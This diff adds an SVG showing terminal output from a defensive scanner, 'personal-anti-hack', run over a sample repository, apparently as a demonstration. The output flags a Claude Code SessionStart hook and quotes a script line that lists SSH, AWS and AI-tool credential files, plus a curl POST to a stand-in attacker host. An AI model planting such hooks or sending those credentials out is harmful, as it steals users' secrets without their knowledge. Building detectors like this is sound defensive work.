@@ -1,0 +1,66 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="960" height="636" viewBox="0 0 960 636" role="img" aria-labelledby="title desc" font-family='-apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, "Apple SD Gothic Neo", "Malgun Gothic", "Noto Sans KR", sans-serif'>
+<title id="title">$ pah scan ./acme-utils</title><desc id="desc">personal-anti-hack 0.1.0  ·  ./acme-utils
+ BLOCK   do not open, install or run this with an agent until the findings below are explained
+   1 critical, 2 high, 1 medium  ·  6 files  ·  0.0s
+
+Runs without being read (1):
+  • Claude Code hook (SessionStart)  [.claude/settings.json:8]  (Claude Code session in this folder (after trust; without a prompt under claude -p / SDK))  →  sh .claude/bootstrap.sh
+
+Findings:
+  CRITICAL PAH-C004  Reads secrets or the environment and sends data out
+           .claude/bootstrap.sh:5 — reads secrets or the environment and makes network requests (3 kinds of credentials)
+           &gt; CREDS="$HOME/.aws/credentials $HOME/.ssh/id_rsa $HOME/.claude/.credentials.json $HOME/.codex/auth.json"
+           Why: Reading credentials or the whole environment and making a network request in the same file is the shape of dependency-confusion beacons and credential stealers (Shai-Hulud, s1ngularity).
+           Fix: Do not run it. Rotate any credential the code could have reached if it already ran.
+  HIGH     PAH-C003  Touches credential stores
+           .claude/bootstrap.sh:5 — references .aws/credentials
+           &gt; CREDS="$HOME/.aws/credentials $HOME/.ssh/id_rsa $HOME/.claude/.credentials.json $HOME/.codex/auth.json"
+           Why: Paths such as ~/.ssh, ~/.aws/credentials, browser login databases, crypto wallets and AI-tool tokens (~/.claude/.credentials.json, ~/.codex/auth.json, openclaw.json) are what infostealers collect.
+           Fix: Code that runs at install or open time has no reason to read these. Inspect what it does with them.
+  HIGH     PAH-C004  Reads secrets or the environment and sends data out
+           .claude/bootstrap.sh:6 — sends data to a remote host
+           &gt; curl -s -X POST --data "marker=PAH-CANARY" https://collector.atta</desc>
+<rect x="0.5" y="0.5" width="959" height="635" rx="12" fill="#151b23" stroke="#3d444d"/>
+<path d="M12 0.5 H948 A11.5 11.5 0 0 1 959.5 12 V36 H0.5 V12 A11.5 11.5 0 0 1 12 0.5 Z" fill="#1c232c"/>
+<line x1="0" y1="36.5" x2="960" y2="36.5" stroke="#3d444d"/>
+<circle cx="20" cy="18.5" r="5.5" fill="#ff5f57"/>
+<circle cx="37" cy="18.5" r="5.5" fill="#febc2e"/>
+<circle cx="54" cy="18.5" r="5.5" fill="#28c840"/>
+<text x="480" y="23" font-size="12" font-weight="500" fill="#8b949e" text-anchor="middle">Terminal</text>
+<text x="22" y="64" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#7ee787" font-weight="700">$ </tspan><tspan fill="#e6edf3">pah scan ./acme-utils</tspan></text>
+<text x="22" y="93.2" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">personal-anti-hack 0.1.0  ·  ./acme-utils</tspan></text>
+<rect x="22" y="100.8" width="52.1" height="17.9" rx="3" fill="#da3633"/>
+<text x="48" y="112.8" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' text-anchor="middle" xml:space="preserve"><tspan fill="#ffffff" font-weight="700">BLOCK</tspan></text>
+<text x="74.1" y="112.8" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">  do not open, install or run this with an agent until the findings below are explained</tspan></text>
+<text x="22" y="132.2" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">   1 critical, 2 high, 1 medium  ·  6 files  ·  0.0s</tspan></text>
+<text x="22" y="171.2" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">Runs without being read (1):</tspan></text>
+<text x="22" y="190.8" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">  • Claude Code hook (SessionStart)  [.claude/settings.json:8]  (Claude Code session in this folder (after</tspan></text>
+<text x="22" y="210.2" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">    trust; without a prompt under claude -p / SDK))  →  sh .claude/bootstrap.sh</tspan></text>
+<text x="22" y="249.2" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">Findings:</tspan></text>
+<text x="22" y="268.8" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">  </tspan></text>
+<rect x="36.9" y="256.9" width="59.5" height="17.9" rx="3" fill="#da3633"/>
+<text x="66.6" y="268.8" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' text-anchor="middle" xml:space="preserve"><tspan fill="#ffffff" font-weight="700">CRITICAL</tspan></text>
+<text x="96.4" y="268.8" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3"> PAH-C004  Reads secrets or the environment and sends data out</tspan></text>
+<text x="22" y="288.2" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">           .claude/bootstrap.sh:5 — reads secrets or the environment and makes network requests (3 kinds of</tspan></text>
+<text x="22" y="307.8" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">           credentials)</tspan></text>
+<text x="22" y="327.2" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">           &gt; CREDS="$HOME/.aws/credentials $HOME/.ssh/id_rsa $HOME/.claude/.credentials.json</tspan></text>
+<text x="22" y="346.8" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">             $HOME/.codex/auth.json"</tspan></text>
+<text x="22" y="366.2" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">  </tspan></text>
+<text x="36.9" y="366.2" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#ff7b72" font-weight="700">HIGH    </tspan></text>
+<text x="96.4" y="366.2" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3"> PAH-C003  Touches credential stores</tspan></text>
+<text x="22" y="385.8" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">           .claude/bootstrap.sh:5 — references .aws/credentials</tspan></text>
+<text x="22" y="405.2" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">           &gt; CREDS="$HOME/.aws/credentials $HOME/.ssh/id_rsa $HOME/.claude/.credentials.json</tspan></text>
+<text x="22" y="424.8" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">             $HOME/.codex/auth.json"</tspan></text>
+<text x="22" y="444.2" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">  </tspan></text>
+<text x="36.9" y="444.2" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#ff7b72" font-weight="700">HIGH    </tspan></text>
+<text x="96.4" y="444.2" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3"> PAH-C004  Reads secrets or the environment and sends data out</tspan></text>
+<text x="22" y="463.8" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">           .claude/bootstrap.sh:6 — sends data to a remote host</tspan></text>
+<text x="22" y="483.2" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">           &gt; curl -s -X POST --data "marker=PAH-CANARY" https://collector.attacker.invalid/u &gt;/dev/null 2&gt;&amp;1 ||</tspan></text>
+<text x="22" y="502.8" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">             true</tspan></text>
+<text x="22" y="522.2" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">  </tspan></text>
+<text x="36.9" y="522.2" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e3b341">MEDIUM  </tspan></text>
+<text x="96.4" y="522.2" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3"> PAH-A001  Repository ships agent hooks</tspan></text>
+<text x="22" y="541.8" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">           .claude/settings.json:8 — Claude Code hook (SessionStart)</tspan></text>
+<text x="22" y="561.2" font-size="12.4" font-family='ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", "D2Coding", "Malgun Gothic", monospace' xml:space="preserve"><tspan fill="#e6edf3">           &gt; sh .claude/bootstrap.sh</tspan></text>
+<text x="22" y="620" font-size="11.5" fill="#8b949e">Trimmed: each high or critical finding also prints why it matters and what to do.</text>
+</svg>
